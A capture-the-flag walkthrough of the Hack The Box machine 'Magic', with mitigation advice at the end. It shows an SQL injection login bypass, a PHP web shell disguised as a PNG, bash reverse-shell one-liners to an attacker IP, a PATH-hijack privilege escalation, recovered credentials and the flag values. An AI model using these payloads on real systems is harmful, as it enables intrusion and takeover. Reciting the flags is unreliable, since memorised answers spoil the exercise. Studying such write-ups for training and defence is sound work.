# Magic HTB Writeup

## Executive Summary

A comprehensive penetration test of the Magic HTB machine revealed multiple critical vulnerabilities including SQL injection authentication bypass, insecure file upload leading to remote code execution, and privilege escalation through PATH hijacking of a vulnerable SUID binary.

## Reconnaissance

### Network Scanning

**Target Declaration:**
```bash
export target=10.129.49.31
```

<img width="480" height="270" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />


**Comprehensive Port Discovery:**
```bash
sudo nmap -p- --min-rate 5000 -sT -vvv $target
```

<img width="877" height="694" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />


**Service Enumeration:**
```bash
sudo nmap -p 22,80 -sC -sV -T4 $target
```

<img width="880" height="382" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />


### Findings
- **Port 22**: SSH service
- **Port 80**: HTTP service (Apache)

## Web Application Assessment

### Initial Discovery
Visiting `http://10.129.49.31` revealed a web application with a login portal at `/login.php`.

<img width="963" height="799" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />

<img width="847" height="634" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />


### Authentication Bypass

**SQL Injection Vulnerability:**
- Discovered SQL injection in login form
- Successful bypass using: `admin' OR 1=1-- -`

**Payload Used:**
```
Username: admin
Password: pass' OR 1=1-- -
```

<img width="588" height="604" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />


### Directory Enumeration

**Gobuster Scan:**
```bash
gobuster dir -u http://$target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50
```

<img width="908" height="438" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />
<img width="993" height="374" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />

**Key Findings:**
- `/upload.php` - File upload functionality
- `/images/` - Directory containing uploaded files

## Initial Access

### File Upload Vulnerability

<img width="750" height="781" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />


**Upload Bypass Technique:**
- Added magic bytes (`PNG`) to PHP shell
- Modified `Content-Type` to `image/png`
- Used double extension: `script.php.png`

<img width="592" height="879" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />


**PHP Web Shell:**
```php
PNG
<?php system($_GET['cmd']); ?>
```

getting a success message
<img width="745" height="196" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />


### Remote Code Execution

**Command Execution:**
```
http://10.129.49.31/images/uploads/script.php.png?cmd=id
```

<img width="960" height="235" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />


**Reverse Shell Payload:**
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.134/9001 0>&1'
```

<img width="960" height="235" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />


**Shell Obtained:**
- User: `www-data`
- Access Level: Web application context

<img width="768" height="722" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur" />


## Post-Exploitation

### Database Credential Discovery

**Location:** `/var/www/Magic/db.php5`

**Credentials Found:**
```php
private static $dbName = 'Magic';
private static $dbHost = 'localhost';
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';
```

<img width="777" height="723" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-15-Upload-To-Imgur" />


### Database Enumeration

**MySQL Dump:**
```bash
mysqldump -u theseus -p Magic
```

<img width="627" height="76" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-16-Upload-To-Imgur" />

**Additional Credentials Discovered:**
- Username: `admin`
- Password: `Th3s3usW4sK1ng`

<img width="487" height="142" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-17-Upload-To-Imgur" />

switch the user to theseus using the password Th3s3usW4sK1ng

<img width="487" height="142" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-18-Upload-To-Imgur" />

### User Access

**SSH Access:**
```bash
ssh -i key theseus@10.129.49.31
```

**Note:do a ssh-keygen in your local machine if you dont have a private and public key and then copy the key.pub public key to the ~/.ssh/authorized_keys and ssh into the box using the private key called key with 
ssh -i key theseus@10.129.49.31**

<img width="959" height="161" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-19-Upload-To-Imgur" />

<img width="946" height="513" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-20-Upload-To-Imgur" />


**User Flag:**
```bash
cat /home/theseus/user.txt
9f6d3eacdb81678cfd6c06d3e82dc76d
```

## Privilege Escalation

### SUID Binary Analysis

**Vulnerable Binary:**
```bash
find / -perm -4000 -type f -user root -ls 2>/dev/null
/bin/sysinfo
```
**Note:try to get setuid binaries owned by root 
find / -perm -4000 -type f -user root -ls 2>/dev/null
we get the /bin/sysinfo which has setuid permission set which is owned by root and in the user group which theseus is a part of**

<img width="967" height="486" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-21-Upload-To-Imgur" />


**Binary Analysis:**
```bash
ltrace /bin/sysinfo
```

<img width="498" height="50" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-22-Upload-To-Imgur" />

<img width="556" height="586" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-23-Upload-To-Imgur" />

**Vulnerability:** Relative path usage for `fdisk` command

### PATH Hijacking Exploitation

**Malicious fdisk Payload:**
```bash
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.134/4444 0>&1"
```

<img width="502" height="181" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-24-Upload-To-Imgur" />


**Exploitation Steps:**
```bash
# Create payload
echo '#!/bin/bash' > /dev/shm/fdisk
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.134/4444 0>&1"' >> /dev/shm/fdisk
chmod +x /dev/shm/fdisk

# Hijack PATH
export PATH="/dev/shm:$PATH"

# Execute vulnerable binary
/bin/sysinfo
```
### Root Access Achieved

<img width="651" height="701" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-25-Upload-To-Imgur" />

root@ubuntu:~# cat /root/root.txt
cat /root/root.txt
7bcb8be400199d35a96ce942c767a9f1

**Root Flag:**
```bash
cat /root/root.txt
7bcb8be400199d35a96ce942c767a9f1
```

## Vulnerability Analysis

### Critical Security Issues

1. **SQL Injection (Critical)**
   - Unparameterized user input in authentication
   - Complete authentication bypass possible

2. **Insecure File Upload (Critical)**
   - Insufficient file type validation
   - Magic byte and Content-Type manipulation
   - Double extension bypass

3. **Insecure SUID Binary (High)**
   - Relative path usage in privileged binary
   - PATH environment variable hijacking
   - Lack of absolute path specification

4. **Information Disclosure (Medium)**
   - Database credentials in web root
   - Plaintext password storage

## Mitigation Recommendations

### Immediate Actions

1. **Input Validation**
   - Implement parameterized queries
   - Add input sanitization for all user inputs
   - Use prepared statements for database operations

2. **File Upload Security**
   - Implement server-side file type verification
   - Use whitelist approach for allowed extensions
   - Store uploaded files outside web root
   - Scan uploaded files for malicious content

3. **System Hardening**
   - Audit all SUID binaries
   - Use absolute paths in system calls
   - Implement principle of least privilege

### Long-term Improvements

1. **Secure Development**
   - Regular security code reviews
   - Implement security testing in CI/CD pipeline
   - Developer security training

2. **Monitoring & Detection**
   - File integrity monitoring
   - Web application firewall
   - Intrusion detection system

## Technical Indicators

### Attack Timeline
1. Network reconnaissance → 2. Web application enumeration → 3. SQL injection authentication bypass → 4. File upload exploitation → 5. Remote code execution → 6. Database credential discovery → 7. User privilege escalation → 8. SUID binary exploitation → 9. Root compromise

### Tools Utilized
- **Nmap**: Network scanning
- **Gobuster**: Directory enumeration
- **Burp Suite**: Web application testing
- **Netcat**: Reverse shell handling
- **MySQL**: Database interaction

### Exploitation Techniques
- SQL Injection authentication bypass
- File upload filter bypass
- PATH hijacking privilege escalation
- SUID binary exploitation

<style> body { background-color: #0a0a0a; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 20px; } .container { max-width: 1200px; margin: 0 auto; background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #333; } h1, h2, h3 { color: #00ff00; border-bottom: 2px solid #333; padding-bottom: 10px; } h1 { text-align: center; color: #00ff00; font-size: 2.5em; margin-bottom: 30px; } .header-section { text-align: center; margin-bottom: 40px; padding: 20px; background: #151515; border-radius: 8px; border-left: 4px solid #00ff00; } .difficulty-badge { display: inline-block; padding: 5px 15px; background: #ffa500; color: #000; border-radius: 20px; font-weight: bold; margin: 10px 0; } .severity-badge { display: inline-block; padding: 5px 15px; background: #ff4444; color: #fff; border-radius: 20px; font-weight: bold; margin-left: 10px; } .tech-tag { background: #333; color: #00ff00; padding: 4px 12px; border-radius: 15px; font-size: 0.9em; margin: 5px 5px 5px 0; display: inline-block; border: 1px solid #00ff00; } /* Target only code blocks with triple backticks and bash */ pre { background: #ffffff; border: 1px solid #333; border-left: 4px solid #00ff00; padding: 15px; overflow-x: auto; margin: 20px 0; border-radius: 5px; color: #000000; } /* Make sure code inside pre inherits the BLACK text color */ pre code { color: #000000; background: transparent; font-family: 'Courier New', monospace; } /* Inline code (single backticks) */ code { color: #00ff00; background: #151515; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; } .image-container { text-align: center; margin: 20px 0; padding: 10px; background: #151515; border-radius: 8px; border: 1px solid #333; } .image-container img { max-width: 100%; height: auto; border: 1px solid #444; border-radius: 5px; } .vulnerability-list { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #ff4444; margin: 20px 0; } .vulnerability-list li { margin: 10px 0; padding-left: 10px; } .attack-chain { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #007bff; margin: 20px 0; } .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; } .tool-item { background: #151515; padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #333; } .tool-item:hover { border-color: #00ff00; transform: translateY(-2px); transition: all 0.3s ease; } /* Scrollbar Styling */ ::-webkit-scrollbar { width: 8px; } ::-webkit-scrollbar-track { background: #1a1a1a; } ::-webkit-scrollbar-thumb { background: #00ff00; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #00cc00; } /* Responsive Design */ @media (max-width: 768px) { .container { padding: 15px; margin: 10px; } h1 { font-size: 2em; } .tools-grid { grid-template-columns: 1fr; } } /* Animation for headers */ h2, h3 { position: relative; } h2::after, h3::after { content: ''; position: absolute; bottom: -2px; left: 0; width: 0; height: 2px; background: #00ff00; transition: width 0.3s ease; } h2:hover::after, h3:hover::after { width: 100%; } </style>
